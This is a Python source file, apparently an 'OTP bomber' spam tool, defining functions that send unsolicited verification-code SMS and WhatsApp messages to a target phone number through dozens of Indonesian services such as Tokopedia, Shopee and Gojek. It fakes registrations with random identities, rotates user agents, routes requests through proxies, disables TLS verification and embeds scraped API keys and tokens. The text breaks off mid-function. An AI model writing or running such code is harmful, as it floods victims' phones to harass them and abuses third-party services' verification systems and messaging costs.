#!/usr/bin/env python3
# handlers.py - 150+ OTP API (FULL FIXED - SEMUA RETURN FORMAT SAMA)

import requests
import uuid
import random
import string
import time
import re
import json
import warnings
from utils import fmt_08, fmt_plus, fmt_phone_only, get_public_ip, get_random_user_agent
from proxy_manager import safe_request

# SUPPRESS WARNINGS
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# ==================== FORMAT FUNCTIONS ====================
def fmt_us(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+1' + phone[1:]
    elif phone.startswith('62'): return '+1' + phone[2:]
    elif phone.startswith('+62'): return '+1' + phone[3:]
    else: return '+1' + phone

def fmt_uk(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+44' + phone[1:]
    elif phone.startswith('62'): return '+44' + phone[2:]
    elif phone.startswith('+62'): return '+44' + phone[3:]
    else: return '+44' + phone

def fmt_in(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+91' + phone[1:]
    elif phone.startswith('62'): return '+91' + phone[2:]
    elif phone.startswith('+62'): return '+91' + phone[3:]
    else: return '+91' + phone

def fmt_br(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+55' + phone[1:]
    elif phone.startswith('62'): return '+55' + phone[2:]
    elif phone.startswith('+62'): return '+55' + phone[3:]
    else: return '+55' + phone

def fmt_jp(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+81' + phone[1:]
    elif phone.startswith('62'): return '+81' + phone[2:]
    elif phone.startswith('+62'): return '+81' + phone[3:]
    else: return '+81' + phone

def fmt_kr(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+82' + phone[1:]
    elif phone.startswith('62'): return '+82' + phone[2:]
    elif phone.startswith('+62'): return '+82' + phone[3:]
    else: return '+82' + phone

def fmt_sg(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+65' + phone[1:]
    elif phone.startswith('62'): return '+65' + phone[2:]
    elif phone.startswith('+62'): return '+65' + phone[3:]
    else: return '+65' + phone

def fmt_my(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+60' + phone[1:]
    elif phone.startswith('62'): return '+60' + phone[2:]
    elif phone.startswith('+62'): return '+60' + phone[3:]
    else: return '+60' + phone

def fmt_ph(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+63' + phone[1:]
    elif phone.startswith('62'): return '+63' + phone[2:]
    elif phone.startswith('+62'): return '+63' + phone[3:]
    else: return '+63' + phone

def fmt_ae(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+971' + phone[1:]
    elif phone.startswith('62'): return '+971' + phone[2:]
    elif phone.startswith('+62'): return '+971' + phone[3:]
    else: return '+971' + phone

def fmt_de(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+49' + phone[1:]
    elif phone.startswith('62'): return '+49' + phone[2:]
    elif phone.startswith('+62'): return '+49' + phone[3:]
    else: return '+49' + phone

def fmt_fr(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+33' + phone[1:]
    elif phone.startswith('62'): return '+33' + phone[2:]
    elif phone.startswith('+62'): return '+33' + phone[3:]
    else: return '+33' + phone

def fmt_tr(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+90' + phone[1:]
    elif phone.startswith('62'): return '+90' + phone[2:]
    elif phone.startswith('+62'): return '+90' + phone[3:]
    else: return '+90' + phone

def fmt_au(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+61' + phone[1:]
    elif phone.startswith('62'): return '+61' + phone[2:]
    elif phone.startswith('+62'): return '+61' + phone[3:]
    else: return '+61' + phone

def fmt_ru(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+7' + phone[1:]
    elif phone.startswith('62'): return '+7' + phone[2:]
    elif phone.startswith('+62'): return '+7' + phone[3:]
    else: return '+7' + phone

def fmt_ca(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+1' + phone[1:]
    elif phone.startswith('62'): return '+1' + phone[2:]
    elif phone.startswith('+62'): return '+1' + phone[3:]
    else: return '+1' + phone

def fmt_eg(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+20' + phone[1:]
    elif phone.startswith('62'): return '+20' + phone[2:]
    elif phone.startswith('+62'): return '+20' + phone[3:]
    else: return '+20' + phone

def fmt_ng(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+234' + phone[1:]
    elif phone.startswith('62'): return '+234' + phone[2:]
    elif phone.startswith('+62'): return '+234' + phone[3:]
    else: return '+234' + phone

def fmt_es(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+34' + phone[1:]
    elif phone.startswith('62'): return '+34' + phone[2:]
    elif phone.startswith('+62'): return '+34' + phone[3:]
    else: return '+34' + phone

def fmt_it(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+39' + phone[1:]
    elif phone.startswith('62'): return '+39' + phone[2:]
    elif phone.startswith('+62'): return '+39' + phone[3:]
    else: return '+39' + phone

def fmt_mx(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+52' + phone[1:]
    elif phone.startswith('62'): return '+52' + phone[2:]
    elif phone.startswith('+62'): return '+52' + phone[3:]
    else: return '+52' + phone

def fmt_nl(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+31' + phone[1:]
    elif phone.startswith('62'): return '+31' + phone[2:]
    elif phone.startswith('+62'): return '+31' + phone[3:]
    else: return '+31' + phone

def fmt_pl(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+48' + phone[1:]
    elif phone.startswith('62'): return '+48' + phone[2:]
    elif phone.startswith('+62'): return '+48' + phone[3:]
    else: return '+48' + phone

def fmt_se(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+46' + phone[1:]
    elif phone.startswith('62'): return '+46' + phone[2:]
    elif phone.startswith('+62'): return '+46' + phone[3:]
    else: return '+46' + phone

def fmt_ar(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+54' + phone[1:]
    elif phone.startswith('62'): return '+54' + phone[2:]
    elif phone.startswith('+62'): return '+54' + phone[3:]
    else: return '+54' + phone

def fmt_co(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+57' + phone[1:]
    elif phone.startswith('62'): return '+57' + phone[2:]
    elif phone.startswith('+62'): return '+57' + phone[3:]
    else: return '+57' + phone

def fmt_cl(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+56' + phone[1:]
    elif phone.startswith('62'): return '+56' + phone[2:]
    elif phone.startswith('+62'): return '+56' + phone[3:]
    else: return '+56' + phone

# ==================== HELPER FUNCTIONS ====================
def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = nomor
        username = "0" + nomor[3:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username

def standard_response(success, status_code=200, message="OK"):
    """Standarisasi return format semua handler"""
    return success, status_code, message

# ================================================================
# ===== INDONESIA - PLATFORM BESAR =====
# ================================================================

# 1. TOKOPEDIA
def send_tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = session.get(url_token, headers={'User-Agent': get_random_user_agent()}, timeout=15, verify=False)
        if resp.status_code != 200:
            return False, resp.status_code, 'Page load failed'
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            return False, None, 'No token'
        token = token_match.group(1)
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {"otp_type": "116", "msisdn": phone_plus, "tk": token, "email": "", "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"}
        headers_otp = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        resp2 = safe_request('POST', url_otp, headers=headers_otp, data=data, timeout=15)
        if resp2 and resp2.status_code == 200:
            return True, 200, 'OK'
        return False, resp2.status_code if resp2 else None, ''
    except:
        return False, None, ''

# 2. SHOPEE
def send_shopee_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        phone_62 = '62' + phone_raw
        url = "https://shopee.co.id/api/v4/otp/send_vcode"
        payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
        session = requests.Session()
        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        csrf_token = session.cookies.get("csrftoken", "")
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
        if csrf_token:
            headers['x-csrftoken'] = csrf_token
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 3. GOJEK
def send_gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"
        data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": "User" + str(random.randint(100,999)), "phone": phone_62, "signed_up_country": "ID"}
        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID', 'Content-Type': 'application/json'}
        resp = safe_request('POST', url, headers=headers, json=data, timeout=15)
        if resp and resp.status_code in [200, 201, 202]:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 4. JENIUS
def send_jenius_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.com/jenius"
        payload = {"query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }", "variables": {"phone": phone_plus, "language": "id"}, "operationName": "registerPhone"}
        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_user_agent(), 'Accept': 'application/json'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 5. BLIBLI
def send_blibli_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"
        payload = {"username": phone_local}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.blibli.com', 'Referer': 'https://www.blibli.com/login'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 6. ALODOKTER
def send_alodokter_otp(phone):
    try:
        url = "https://www.alodokter.com/login-with-phone-number"
        payload = {"user": {"phone": fmt_08(phone)}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 7. HALODOC
def send_halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.halodoc.com', 'x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 8. OYO
def send_oyo_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"
        payload = {"phone": phone_raw, "country_code": "+62", "country_iso_code": "ID", "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"}
        headers = {'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.oyorooms.com'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 9. SAYURBOX
def send_sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
        payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.sayurbox.com'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 10. CARSOME
def send_carsome_otp(phone):
    try:
        url = "https://www.carsome.id/website/login/sendSMS"
        payload = {"username": fmt_08(phone), "optType": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 11. PIZZAHUT
def send_pizzahut_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=6))
        url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"
        payload = {"email": f"{name.lower()}@gmail.com", "first_name": name, "last_name": "Test", "password": "Pass123!", "phone": phone_08, "birthday": "2000-01-01"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 12. MATAHARI
def send_matahari_otp(phone):
    try:
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
        payload = {"otp_request": {"mobile_number": fmt_08(phone), "mobile_country_code": "+62"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 13. OLX
def send_olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 14. INDIHOME
def send_indihome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
        data = {'type': 'hp', 'msisdn': phone_raw}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 15. TIKTOK
def send_tiktok_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"
        payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.tiktok.com'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code in [200, 201]:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# ================================================================
# ===== INDONESIA - FINANCE & MARKETPLACE =====
# ================================================================

# 16. PINHOME
def send_pinhome_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": phone_local}
        headers = {'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 17. MAULAGI
def send_maulagi_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://api.maulagi.id/api/v2/auth/check"
        payload = {"credentials": phone_local}
        headers = {'Content-Type': 'application/json', 'x-ml-key': 'E32VCHXX32', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 18. PLANETBAN
def send_planetban_otp(phone):
    try:
        url = "https://api.planetban.com/website/customer/request-otp"
        payload = {"name": "Test", "phone": fmt_08(phone), "password": "Test123", "purpose": "register", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 19. DUNIAGAMES
def send_duniagames_otp(phone):
    try:
        phone_plus, username = format_nomor(phone)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": phone_plus, "userName": username}
        headers = {'Content-Type': 'application/json', 'x-device': str(uuid.uuid4()), 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 20. ACC
def send_acc_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.acc.co.id/register/new-account"
        payload = f'[{{"user_id":null,"action":"register","send_to":"{phone_local}","provider":"whatsapp"}}]'
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'next-action': '7f4271400eb36624563cc4172891e0c821039f2fca'}
        resp = safe_request('POST', url, headers=headers, data=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 21. ABSENKU
def send_absenku_otp(phone):
    try:
        phone_local = fmt_08(phone)
        sess = requests.Session()
        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_user_agent()}, timeout=15, verify=False)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={"nama": "Nama Lengkap", "email": "email@gmail.com", "telp": phone_local, "company_name": "PT Test", "jumlah": "10", "tujuan": "1", "paket": "21", "ci_csrf_token": ""}, headers=headers, timeout=15, verify=False)
        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_local}, headers=headers, timeout=15, verify=False)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 22. SATURDAYS
def send_saturdays_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        payload = {"number": phone_local, "country_code": "+62", "type": ""}
        headers = {'Content-Type': 'application/json', 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 23. SINGA
def send_singa_otp(phone):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
        payload = {"mobile_phone": fmt_08(phone), "type": "mobile", "is_switchable": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 24. ADIRAKU
def send_adiraku_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        payload = {"mobileNumber": phone_local, "type": "prospect-create", "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 25. PAYFAZ
def send_payfaz_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://api.payfazz.com/v2/phoneVerifications"
        data = {"phone": phone_local}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 26. BONUS BELANJA
def send_bonusbelanja_otp(phone):
    try:
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        payload = {"phone": fmt_08(phone), "name": "User", "agreeTnc": True, "agreeContact": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 27. HIJUP
def send_hijup_otp(phone):
    try:
        url = "https://www.hijup.com/sign_in"
        payload = [{"phone_number": fmt_phone_only(phone), "store_path": "hijup"}]
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 28. BLIBLI TIKET
def send_bliblitiket_otp(phone):
    try:
        url = "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate"
        payload = {"action": "REGISTER_OTP", "channel": "WHATS_APP", "recipient": fmt_plus(phone), "recaptchaToken": ""}
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_user_agent(), 'x-request-id': str(uuid.uuid4()), 'x-channel-id': 'MWEB', 'x-entity': 'TIKET'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 29. OHSOME
def send_ohsome_otp(phone):
    try:
        url = "https://ohsome.co.id/api/member/user/random_code_check"
        payload = {"country_code": "62", "account": fmt_phone_only(phone), "type_id": 2, "device_id": str(uuid.uuid4()).replace('-', ''), "check_code": str(random.randint(100000,999999)), "image_id": ''.join(random.choices(string.ascii_letters + string.digits, k=20))}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'deviceid': str(uuid.uuid4()).replace('-', '')}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 30. OPTIK MELAWAI
def send_optikmelawai_otp(phone):
    try:
        url = "https://api.optikmelawai.com/api/v3/auth/register/1"
        payload = {"phone": fmt_phone_only(phone), "name": "User", "email": f"user{random.randint(1000,9999)}@gmail.com"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 31. HOLLAND BAKERY
def send_hollandbakery_otp(phone):
    try:
        sess = requests.Session()
        sess.get("https://www.hollandbakery.co.id/login-phone", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        url = "https://www.hollandbakery.co.id/resend-otp-register"
        data = {"phone": fmt_phone_only(phone)}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 32. HASH MICRO
def send_hashmicro_otp(phone):
    try:
        url = "https://website-api.hashmicro.com/api/add/3"
        name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
        data = {'fullname': name, 'phonenumber': fmt_08(phone), 'email': f"{name.lower()}@gmail.com", 'companyname': f'PT {name}', 'medium': '55', 'source': '143'}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 33. INTERNET RAKYAT
def send_internetrakyat_otp(phone):
    try:
        url = "https://internetrakyat.id/api/app/auth/send-otp-register"
        payload = {"phone_number": fmt_08(phone)}
        headers = {'Content-Type': 'application/json', 'x-api-key': '280999!FTTH', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 34. ULTRAMILK
def send_ultramilk_otp(phone):
    try:
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
        payload = {"name": name, "email": f"{name.lower()}@gmail.com", "password": "Pass123!", "phone_number": fmt_phone_only(phone), "portal": "IcownicPatch", "is_consent": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code in [200, 201]:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 35. KANIVA
def send_kaniva_otp(phone):
    try:
        sess = requests.Session()
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        csrf = sess.cookies.get("XSRF-TOKEN", "")
        if not csrf:
            return False, None, 'No CSRF'
        url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
        payload = {"name": name, "phone": phone_08}
        headers = {'X-XSRF-TOKEN': csrf, 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 36. JEMBATANI
def send_jembatani_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        password = 'Pass' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        url = "https://api.jembatani.co.id/v1/register"
        payload = {"phone_number": phone_08, "name": name, "role": "farmer", "password": password, "password_confirmation": password, "consent": "1"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'success' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        url2 = "https://api.jembatani.co.id/v1/regenerate-otp"
        resp2 = safe_request('POST', url2, headers=headers, json={"phone_number": phone_08}, timeout=15)
        if resp2 and resp2.status_code < 400:
            return True, resp2.status_code, 'Resend'
